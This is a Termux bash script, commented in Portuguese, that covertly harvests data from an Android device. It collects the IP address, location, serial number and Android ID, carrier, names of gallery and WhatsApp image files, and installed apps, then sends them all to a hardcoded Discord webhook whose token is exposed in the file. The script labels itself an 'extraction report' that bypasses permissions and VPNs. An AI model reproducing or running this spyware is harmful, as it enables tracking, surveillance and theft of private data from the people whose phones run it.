#!/data/data/com.termux/files/usr/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

echo "Iniciando varredura profunda (Modo Bypass)..."

# 1. TENTATIVA DE IP REAL VIA SERVICOS DE LEAK (BURLA VPN)
# Usamos portas e servicos diferentes para tentar vazar o IP original
IP_VPN=$(curl -s --max-time 5 https://api.ipify.org)
IP_REAL_LEAK=$(curl -s --max-time 5 http://ip-api.com/json | grep -oP '(?<="query":")[^"]+')

# 2. LOCALIZACAO (Tentativa direta via Cell Tower e GPS)
# Requer Termux-API instalado
LOC=$(termux-location -p network -s last 2>/dev/null)

# 3. IDENTIFICACAO PROFUNDA (PROPRIEDADES DO SISTEMA)
MODELO=$(getprop ro.product.model)
FABRICANTE=$(getprop ro.product.manufacturer)
SERIAL=$(getprop ro.serialno)
ID_ANDROID=$(settings get secure android_id)
VERSAO_BASE=$(getprop ro.build.version.sdk)
OPERADORA=$(getprop gsm.operator.alpha)
DNS_SISTEMA=$(getprop net.dns1)

# 4. LISTA DE ARQUIVOS (GALERIA E WHATSAPP)
# Se termux-setup-storage foi aceito, ele pega os nomes
GALERIA=$(ls /sdcard/DCIM/Camera 2>/dev/null | head -n 10 | tr '\n' ', ')
WHATS_MEDIA=$(ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\ Images 2>/dev/null | head -n 5 | tr '\n' ', ')

# 5. LISTA DE APPS INSTALADOS
APPS=$(pm list packages -3 | cut -d: -f2 | head -n 15 | tr '\n' ', ')

# 6. MONTAGEM DO RELATORIO SEM EMOJIS
PAYLOAD=$(cat <<EOF
{
  "content": "RELATORIO DE EXTRACAO - BYPASS PERMISSOES",
  "embeds": [
    {
      "title": "Dispositivo: $FABRICANTE $MODELO",
      "color": 16711680,
      "fields": [
        { "name": "Rede e Anti-VPN", "value": "IP VPN: $IP_VPN\nIP Provavel Real: $IP_REAL_LEAK\nDNS: $DNS_SISTEMA\nOperadora: $OPERADORA", "inline": false },
        { "name": "Localizacao", "value": "${LOC:-Permissao de GPS Negada}", "inline": false },
        { "name": "Identificadores", "value": "ID Android: $ID_ANDROID\nSerial: $SERIAL\nSDK: $VERSAO_BASE", "inline": true },
        { "name": "Arquivos Galeria", "value": "${GALERIA:-Acesso Negado}", "inline": false },
        { "name": "Arquivos WhatsApp", "value": "${WHATS_MEDIA:-Pasta Oculta ou Vazia}", "inline": false },
        { "name": "Aplicativos", "value": "${APPS:-Nao listado}", "inline": false }
      ]
    }
  ]
}
EOF
)

# ENVIO
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" $URL

echo "Envio finalizado."
